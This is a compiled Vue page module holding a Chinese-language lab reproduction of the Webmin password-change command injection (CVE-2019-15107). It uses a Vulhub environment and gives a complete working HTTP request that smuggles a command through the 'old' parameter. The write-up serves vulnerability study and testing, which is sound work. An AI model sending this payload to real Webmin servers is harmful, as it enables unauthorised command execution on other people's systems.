import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as a,o as s,c as r,a as e,b as n,d as t,e as d}from"./app-58e4a7d6.js";const l={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),p=e("p",null,"Webmin是一个用于管理类Unix系统的管理配置工具，具有Web页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。",-1),m=e("p",null,"参考链接：",-1),u={href:"https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html",target:"_blank",rel:"noopener noreferrer"},h={href:"https://www.exploit-db.com/exploits/47230",target:"_blank",rel:"noopener noreferrer"},b={href:"https://blog.firosolutions.com/exploits/webmin/",target:"_blank",rel:"noopener noreferrer"},_=d(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令，启动webmin 1.910：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行完成后，访问<code>https://your-ip:10000</code>，忽略证书后即可看到webmin的登录页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022236263.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>参考链接中的数据包是不对的，经过阅读代码可知，只有在发送的user参数的值不是已知Linux用户的情况下（而参考链接中是<code>user=root</code>），才会进入到修改<code>/etc/shadow</code>的地方，触发命令注入漏洞。</p><p>发送如下数据包，即可执行命令<code>id</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /password_change.cgi HTTP/1.1
Host: your-ip:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://your-ip:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022241640.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,10);function v(g,x){const i=a("ExternalLinkIcon");return s(),r("div",null,[c,p,m,e("ul",null,[e("li",null,[e("a",u,[n("https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html"),t(i)])]),e("li",null,[e("a",h,[n("https://www.exploit-db.com/exploits/47230"),t(i)])]),e("li",null,[e("a",b,[n("https://blog.firosolutions.com/exploits/webmin/"),t(i)])])]),_])}const k=o(l,[["render",v],["__file","Webmin 远程命令执行漏洞 CVE-2019-15107.html.vue"]]);export{k as default};
